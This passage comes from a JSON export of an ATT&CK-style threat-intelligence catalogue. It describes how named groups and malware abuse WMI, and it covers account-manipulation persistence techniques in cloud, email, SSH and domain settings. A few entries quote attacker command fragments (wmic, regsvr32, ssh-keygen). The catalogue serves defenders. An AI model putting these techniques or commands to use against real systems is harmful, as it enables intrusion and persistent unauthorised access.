2024, with the WMIC feature being \"disabled by default\" on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by PowerShell as the primary WMI interface. In addition to PowerShell and tools like wbemtool.exe, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.", "id": "T1047", "examples": [{"id": "C0025", "name": "2016 Ukraine Electric Power Attack", "description": "During the 2016 Ukraine Electric Power Attack, WMI in scripts were used for remote execution and system surveys. "}, {"id": "S1028", "name": "Action RAT", "description": "Action RAT can use WMI to gather AV products installed on an infected host."}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla has used wmi queries to gather information from the system."}, {"id": "S1129", "name": "Akira", "description": "Akira will leverage COM objects accessed through WMI during execution to evade detection."}, {"id": "G0016", "name": "APT29", "description": "APT29 used WMI to steal credentials and execute backdoors at a future time."}, {"id": "G0050", "name": "APT32", "description": "APT32 used WMI to deploy their tools on remote machines and to gather information about the Outlook process."}, {"id": "G0096", "name": "APT41", "description": "APT41 used WMI in several ways, including for execution of commands via WMIEXEC as well as for persistence via PowerSploit. APT41 has executed files through Windows Management Instrumentation (WMI)."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda used WMI for lateral movement in victim environments."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth uses WMIC to execute payloads. "}, {"id": "S0640", "name": "Avaddon", "description": "Avaddon uses wmic.exe to delete shadow copies."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can utilize WMI to collect system information, create new processes, and run malicious PowerShell scripts on a compromised machine."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can execute a WMI query to gather information about the installed antivirus engine."}, {"id": "S1070", "name": "Black Basta", "description": "Black Basta has used WMI to execute files over the network."}, {"id": "S1068", "name": "BlackCat", "description": "BlackCat can use wmic.exe to delete shadow copies on compromised networks."}, {"id": "S0089", "name": "BlackEnergy", "description": "A BlackEnergy 2 plug-in uses WMI to gather victim host details."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has used wmic.exe to set environment variables."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 can use WMI to move laterally."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can use WMI to gather system information and to spawn processes for code injection."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors used wmic and rundll32 to load Cobalt Strike onto a target host."}, {"id": "C0018", "name": "C0018", "description": "During C0018, the threat actors used WMIC to modify administrative settings on both a local and a remote host, likely as part of the first stages for their lateral movement; they also used WMI Provider Host (wmiprvse.exe) to execute a variety of encoded PowerShell scripts using the DownloadString method."}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider used Windows Management Instrumentation (WMI) to move laterally via Impacket."}, {"id": "S0674", "name": "CharmPower", "description": "CharmPower can use wmic to gather information from a system."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used WMIC to execute remote commands."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has used Impacket for lateral movement via WMI."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use WMI to deliver a payload to a remote host."}, {"id": "S1155", "name": "Covenant", "description": "Covenant can utilize WMI to install new Grunt listeners through XSL files or command one-liners."}, {"id": "S0488", "name": "CrackMapExec", "description": "CrackMapExec can execute remote commands using Windows Management Instrumentation."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can use WMI queries to obtain system information."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman can use WMI to execute commands."}, {"id": "S0616", "name": "DEATHRANSOM", "description": "DEATHRANSOM has the ability to use WMI to delete volume shadow copies."}, {"id": "G0009", "name": "Deep Panda", "description": "The Deep Panda group is known to utilize WMI for lateral movement."}, {"id": "S0062", "name": "DustySky", "description": "The DustySky dropper uses Windows Management Instrumentation to extract information about the operating system and whether an anti-virus is active."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca used a VBA script to execute WMI."}, {"id": "S0605", "name": "EKANS", "description": "EKANS can use Windows Mangement Instrumentation (WMI) calls to execute operations."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has used WMI execution with password hashes for command execution and lateral movement."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has used WMI to execute powershell.exe."}, {"id": "S0363", "name": "Empire", "description": "Empire can use WMI to deliver a payload to a remote host."}, {"id": "S0396", "name": "EvilBunny", "description": "EvilBunny has used WMI to gather information about the system."}, {"id": "S0568", "name": "EVILNUM", "description": "EVILNUM has used the Windows Management Instrumentation (WMI) tool to enumerate infected machines."}, {"id": "S0267", "name": "FELIXROOT", "description": "FELIXROOT uses WMI to query the Windows Registry."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has utilized WMI to execute commands and move laterally on compromised Windows machines."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used WMI to automate the remote execution of PowerShell scripts."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has used WMI to install malware on targeted systems."}, {"id": "G0061", "name": "FIN8", "description": "FIN8's malicious spearphishing payloads use WMI to launch malware and spawn cmd.exe execution. FIN8 has also used WMIC and the Impacket suite for lateral movement, as well as during and post compromise cleanup activities."}, {"id": "S0618", "name": "FIVEHANDS", "description": "FIVEHANDS can use WMI to delete files on a  target machine."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy leverages WMI to enumerate anti-virus on the victim."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors used WMI queries to check if various security applications were running as well as to determine the operating system version."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can use WMI to open a Windows command shell on a remote machine."}, {"id": "C0007", "name": "FunnyDream", "description": "During FunnyDream, the threat actors used wmiexec.vbs to run remote commands."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM used WMI for execution to assist in lateral movement as well as for installing tools across multiple assets."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has used WMI to execute scripts used for discovery and for determining the C2 IP address."}, {"id": "S0237", "name": "GravityRAT", "description": "GravityRAT collects various information via WMI requests, including CPU information in the Win32_Processor entry (Processor ID, Name, Manufacturer and the clock speed)."}, {"id": "S0151", "name": "HALFBAKED", "description": "HALFBAKED can use WMI queries to gather system information."}, {"id": "S0617", "name": "HELLOKITTY", "description": "HELLOKITTY can use WMI to delete volume shadow copies."}, {"id": "S0698", "name": "HermeticWizard", "description": "HermeticWizard can use WMI to create a new process on a remote machine via C:\\windows\\system32\\cmd.exe /c start C:\\windows\\system32\\\\regsvr32.exe /s /iC:\\windows\\<filename>.dll."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors used WMI to modify Windows Defender settings."}, {"id": "S0376", "name": "HOPLIGHT", "description": "HOPLIGHT has used WMI to recompile the Managed Object Format (MOF) files in the WMI repository."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has used WMI to execute binaries."}, {"id": "S1152", "name": "IMAPLoader", "description": "IMAPLoader uses WMI queries to query system information on victim hosts."}, {"id": "S0357", "name": "Impacket", "description": "Impacket's wmiexec module can be used to execute commands through WMI."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has used WMIC to deploy ransomware."}, {"id": "S1139", "name": "INC Ransomware", "description": "INC Ransomware has the ability to use wmic.exe to spread to multiple endpoints within a compromised environment."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has used WMIC to execute commands on remote computers."}, {"id": "S0283", "name": "jRAT", "description": "jRAT uses WMIC to identify anti-virus products installed on the victim\u2019s machine and to obtain firewall details."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar obtains a list of running processes through WMI querying."}, {"id": "S0250", "name": "Koadic", "description": "Koadic can use WMI to execute commands."}, {"id": "S0156", "name": "KOMPROGO", "description": "KOMPROGO is capable of running WMI queries."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus has used WMI in malicious email infection chains to facilitate the installation of remotely-hosted files."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used WMIC for discovery as well as to execute payloads for persistence and lateral movement."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has used WMI for execution."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer can use WMI to log into remote machines for propagation."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can use WMI queries for discovery on the victim host."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used a tool to run cmd /c wmic computersystem get domain for discovery."}, {"id": "S0449", "name": "Maze", "description": "Maze has used WMI to attempt to delete the shadow volumes on a machine, and to connect a virtual machine to the network domain of the victim organization's network."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used a modified version of pentesting script wmiexec.vbs, which logs into a remote machine using WMI."}, {"id": "S0688", "name": "Meteor", "description": "Meteor can use wmic.exe as part of its effort to delete shadow copies."}, {"id": "S0339", "name": "Micropsia", "description": "Micropsia searches for anti-virus software and firewall products installed on the victim\u2019s machine using WMI."}, {"id": "S0553", "name": "MoleNet", "description": "MoleNet can perform WMI commands on the system."}, {"id": "S0256", "name": "Mosquito", "description": "Mosquito's installer uses WMI to search for antivirus display names."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used malware that leveraged WMI for execution and querying host information."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has executed PowerShell scripts via WMI."}, {"id": "G0019", "name": "Naikon", "description": "Naikon has used WMIC.exe for lateral movement."}, {"id": "S0457", "name": "Netwalker", "description": "Netwalker can use WMI to delete Shadow Volumes."}, {"id": "S0368", "name": "NotPetya", "description": "NotPetya can use wmic to help propagate itself across a network."}, {"id": "S0340", "name": "Octopus", "description": "Octopus has used wmic.exe for local discovery information."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used WMI for execution."}, {"id": "S0365", "name": "Olympic Destroyer", "description": "Olympic Destroyer uses WMI to help propagate itself across a network."}, {"id": "S0264", "name": "OopsIE", "description": "OopsIE uses WMI to perform discovery techniques."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group used WMIC to executed a remote XSL script."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors has used WMI to execute commands."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 has a number of modules that use WMI to execute tasks."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit's Invoke-WmiCommand CodeExecution module uses WMI to execute and retrieve the output from a PowerShell payload."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS can use WMI queries to retrieve data from compromised hosts."}, {"id": "S0184", "name": "POWRUNER", "description": "POWRUNER may use WMI when collecting information about a victim."}, {"id": "S0654", "name": "ProLock", "description": "ProLock can use WMIC to execute scripts on targeted hosts."}, {"id": "S1032", "name": "PyDCrypt", "description": "PyDCrypt has attempted to execute with WMIC."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can execute WMI queries to gather information."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin can execute via LNK containing a command to run a legitimate executable, such as wmic.exe, to download a malicious Windows Installer (MSI) package."}, {"id": "S0241", "name": "RATANKBA", "description": "RATANKBA uses WMI to perform process monitoring."}, {"id": "S0375", "name": "Remexi", "description": "Remexi executes received commands with wmic.exe (for WMI commands). "}, {"id": "S0496", "name": "REvil", "description": "REvil can use WMI to monitor for and kill specific processes listed in its configuration file."}, {"id": "S0270", "name": "RogueRobin", "description": "RogueRobin uses various WMI queries to check if the sample is running in a sandbox."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used Impacket\u2019s WMIexec module for remote code execution and VBScript to run WMI queries."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic can use WMI to execute PowerShell commands on a compromised machine."}, {"id": "S0546", "name": "SharpStage", "description": "SharpStage can use WMI for execution."}, {"id": "S0589", "name": "Sibot", "description": "Sibot has used WMI to discover network connections and configurations. Sibot has also used the Win32_Process class to execute a malicious DLL."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can use WMI for lateral movement."}, {"id": "S1086", "name": "Snip3", "description": "Snip3 can query the WMI class Win32_ComputerSystem to gather information."}, {"id": "S1124", "name": "SocGholish", "description": "SocGholish has used WMI calls for script execution and system profiling."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used WMI for the remote execution of files for lateral movement."}, {"id": "G0038", "name": "Stealth Falcon", "description": "Stealth Falcon malware gathers system information via Windows Management Instrumentation (WMI)."}, {"id": "S0380", "name": "StoneDrill", "description": "StoneDrill has used the WMI command-line (WMIC) utility to run tasks."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet used WMI with an explorer.exe token to execute on a remote share."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST used the WMI query Select * From Win32_SystemDriver to retrieve a driver listing."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady can use WMI queries to detect the presence of a virtual machine environment."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can use WMI for execution on a compromised host."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has used WMI to query targeted systems for security products."}, {"id": "G0027", "name": "Threat Group-3390", "description": "A Threat Group-3390 tool can use WMI to execute a binary."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has used WMI to execute scripts for post exploit document collection."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif droppers have used WMI classes to execute PowerShell commands."}, {"id": "S0476", "name": "Valak", "description": "Valak can use wmic process call create in a scheduled task to launch plugins and for execution."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has leveraged WMIC for execution, remote system discovery, and to create and use temporary directories."}, {"id": "S0366", "name": "WannaCry", "description": "WannaCry utilizes wmic to delete shadow copies."}, {"id": "G0112", "name": "Windshift", "description": "Windshift has used WMI to collect information about target machines."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used WMI and LDAP queries for network discovery and to move laterally. Wizard Spider has also used batch scripts to leverage WMIC to deploy ransomware."}, {"id": "S0251", "name": "Zebrocy", "description": "One variant of Zebrocy uses WMI queries to gather information."}], "sub_techniques": []}]}, {"name": "Persistence", "description": "The adversary is trying to maintain their foothold.Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code.", "id": "TA0003", "techniques": [{"name": "Account Manipulation", "description": "Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials.", "detailed_description": "Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials.\nIn order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged Valid Accounts.", "id": "T1098", "examples": [{"id": "C0025", "name": "2016 Ukraine Electric Power Attack", "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team used the sp_addlinkedsrvlogin command in MS-SQL to create a link between a created account and other servers in the network."}, {"id": "S0274", "name": "Calisto", "description": "Calisto adds permissions and remote logins to all users."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has granted privileges to domain accounts."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware WhiskeyDelta-Two contains a function that attempts to rename the administrator\u2019s account."}, {"id": "S0002", "name": "Mimikatz", "description": "The Mimikatz credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality. The LSADUMP::ChangeNTLM and LSADUMP::SetNTLM modules can also manipulate the password hash of an account without knowing the clear text value."}], "sub_techniques": [{"name": "Additional Cloud Credentials", "description": "Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.", "detailed_description": "Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\nFor example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure / Entra ID. These credentials include both x509 keys and passwords. With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through Cloud Accounts, adversaries may generate or import their own SSH keys using either the CreateKeyPair or ImportKeyPair API in AWS or the gcloud compute os-login ssh-keys add command in GCP. This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.\nAdversaries may also use the CreateAccessKey API in AWS or the gcloud iam service-accounts keys create command in GCP to add access keys to an account. Alternatively, they may use the CreateLoginProfile API in AWS to add a password that can be used to log into the AWS Management Console for Cloud Service Dashboard. If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. Cloud Accounts). For example, in Entra ID environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal\u2019s roles and permissions, which may be different from those of the Application Administrator.\nIn AWS environments, adversaries with the appropriate permissions may also use the sts:GetFederationToken API call to create a temporary set of credentials to Forge Web Credentials tied to the permissions of the original user account. These temporary credentials may remain valid for the duration of their lifetime even if the original account\u2019s API credentials are deactivated.\nIn Entra ID environments with the app password feature enabled, adversaries may be able to add an app password to a user account. As app passwords are intended to be used with legacy devices that do not support multi-factor authentication (MFA), adding an app password can allow an adversary to bypass MFA requirements. Additionally, app passwords may remain valid even if the user\u2019s primary password is reset.", "id": "T1098.001", "examples": [{"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider used aws_consoler  to create temporary federated credentials for fake users in order to obfuscate which AWS credential is compromised and enable pivoting from the AWS CLI to console sessions without MFA."}, {"id": "S1091", "name": "Pacu", "description": "Pacu can generate SSH and API keys for AWS infrastructure and additional API keys for other IAM users."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 added credentials to OAuth Applications and Service Principals."}]}, {"name": "Additional Email Delegate Permissions", "description": "Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account.", "detailed_description": "Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account.\nFor example, the Add-MailboxPermission PowerShell cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox. In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.\nAdversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user\u2019s mail folders.\nThis may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add Additional Cloud Roles to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: Internal Spearphishing), so the messages evade spam/phishing detection mechanisms.", "id": "T1098.002", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has used a Powershell cmdlet to grant the ApplicationImpersonation role to a compromised account."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used a compromised global administrator account in Azure AD to backdoor a service principal with ApplicationImpersonation rights to start collecting emails from targeted mailboxes; APT29 has also used compromised accounts holding ApplicationImpersonation rights in Exchange to collect emails."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors added the ApplicationImpersonation management role to accounts under their control to impersonate users and take ownership of targeted mailboxes."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound granted compromised email accounts read access to the email boxes of additional targeted accounts. The group then was able to authenticate to the intended victim's OWA (Outlook Web Access) portal and read hundreds of email communications for information on Middle East organizations."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 added their own devices as allowed IDs for active sync using Set-CASMailbox, allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals."}]}, {"name": "Additional Cloud Roles", "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments. With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).", "detailed_description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments. With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).\nThis account modification may immediately follow Create Account or other malicious account activity. Adversaries may also modify existing Valid Accounts that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the CreatePolicyVersion API to define a new version of an IAM policy or the AttachUserPolicy API to attach an IAM policy with additional or distinct permissions to a compromised user account.\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to Create Account or modify a victim-owned account.", "id": "T1098.003", "examples": [{"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider used IAM manipulation to gain persistence and to assume or elevate privileges."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has added the global admin role to accounts they have created in the targeted organization's cloud instances."}, {"id": "G1015", "name": "Scattered Spider", "description": "During C0027, Scattered Spider used IAM manipulation to gain persistence and to assume or elevate privileges.Scattered Spider has also assigned user access admin roles in order to gain Tenant Root Group management permissions in Azure."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 granted company administrator privileges to a newly created service principle."}]}, {"name": "SSH Authorized Keys", "description": "Adversaries may modify the SSH authorized_keys file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The authorized_keys file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <user-home>/.ssh/authorized_keys. Users may edit the system\u2019s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value \"yes\" to ensure public key and RSA authentication are enabled. The SSH config file is usually located under /etc/ssh/sshd_config.", "detailed_description": "Adversaries may modify the SSH authorized_keys file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The authorized_keys file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <user-home>/.ssh/authorized_keys. Users may edit the system\u2019s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value \"yes\" to ensure public key and RSA authentication are enabled. The SSH config file is usually located under /etc/ssh/sshd_config.\nAdversaries may modify SSH authorized_keys files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI\u2019s \"add-metadata\" command an adversary may add SSH keys to a user account. Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API. This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH. It may also lead to privilege escalation where the virtual machine or instance has distinct permissions from the requesting user.\nWhere authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user.\nSSH keys can also be added to accounts on network devices, such as with the ip ssh pubkey-chain Network Device CLI command.", "id": "T1098.004", "examples": [{"id": "S0482", "name": "Bundlore", "description": "Bundlore creates a new key pair with ssh-keygen and drops the newly created user key in authorized_keys to enable remote login."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has dropped an SSH-authorized key in the /root/.ssh folder in order to access a compromised server with SSH."}, {"id": "S0468", "name": "Skidmap", "description": "Skidmap has the ability to add the public key of its handlers to the authorized_keys file to maintain persistence on an infected host."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has added RSA keys in authorized_keys."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET will create an ssh key if necessary with the ssh-keygen -t rsa -f $HOME/.ssh/id_rsa -P command. XCSSET will upload a private key file to the server to remotely access the host without a password."}]}, {"name": "Device Registration", "description": "Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.", "detailed_description": "Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.\nMFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user\u2019s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network. In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account.\nSimilarly, an adversary with existing access to a network may register a device to Entra ID and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.\nDevices registered in Entra ID may be able to conduct Internal Spearphishing campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client. Additionally, an adversary may be able to perform a Service Exhaustion Flood on an Entra ID tenant by registering a large number of devices.", "id": "T1098.005", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can register a device to Azure AD."}, {"id": "G0016", "name": "APT29", "description": "APT29 has enrolled their own devices into compromised cloud tenants, including enrolling a device in MFA to an Azure AD environment following a successful password guessing attack against a dormant account."}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider registered devices for MFA to maintain persistence through victims' VPN."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 registered devices in order to enable mailbox syncing via the Set-CASMailbox command."}]}, {"name": "Additional Container Cluster Roles", "description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account. Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.", "detailed_description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account. Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.\nThis account modification may immediately follow Create Account or other malicious account activity. Adversaries may also modify existing Valid Accounts that they have compromised.\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments. In these cases, this technique may be used in conjunction with Additional Cloud Roles.", "id": "T1098.006", "examples": []}, {"name": "Additional Local or Domain Groups", "description": "An adversary may add additional local or domain groups to an adversary-controlled account to maintain persistent access to a system or domain.", "detailed_description": "An adversary may add additional local or domain groups to an adversary-controlled account to maintain persistent access to a system or domain.\nOn Windows, accounts may use the net localgroup and net group commands to add existing users to local and domain groups. On Linux, adversaries may use the usermod command for the same purpose.\nFor example, accounts may be added to the local administrators group on Windows devices to maintain elevated privileges. They may also be added to the Remote Desktop Users group, which allows them to leverage Remote Desktop Protocol to log into the endpoints in the future. On Linux, accounts may be added to the sudoers group, allowing them to persistently leverage Sudo and Sudo Caching for elevated privileges.\nIn Windows environments, machine accounts may also be added to domain groups. This allows the local SYSTEM account to gain privileges on the domain.", "id": "T1098.007", "examples": [{"id": "G0022", "name": "APT3", "description": "APT3 has been known to add created accounts to local admin groups to maintain elevated access."}, {"id": "G0096", "name": "APT41", "description": "APT41 has added user accounts to the User and Admin groups."}, {"id": "G1023", "name": "APT5", "description": "APT5 has created their own accounts with Local Administrator privileges to maintain access to systems with short-cycle credential rotation."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate elevates accounts created through the malware to the local administration group during execution."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has added newly created accounts to the administrators group to maintain elevated access."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has assigned newly created accounts the sysadmin role to maintain persistence."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has added accounts to specific groups with net localgroup."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has added a user named DefaultAccount to the Administrators and Remote Desktop Users groups."}, {"id": "S0039", "name": "Net", "description": "The net localgroup and net group commands in Net can be used to add existing users to local and domain groups. "}, {"id": "S0382", "name": "ServHelper", "description": "ServHelper has added a user named \"supportaccount\" to the Remote Desktop Users and Administrators groups."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "SMOKEDHAM has added user accounts to local Admin groups."}]}]}, {"name": "BITS Jobs", "description": "Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.", "detailed_description": "Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\nThe interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin 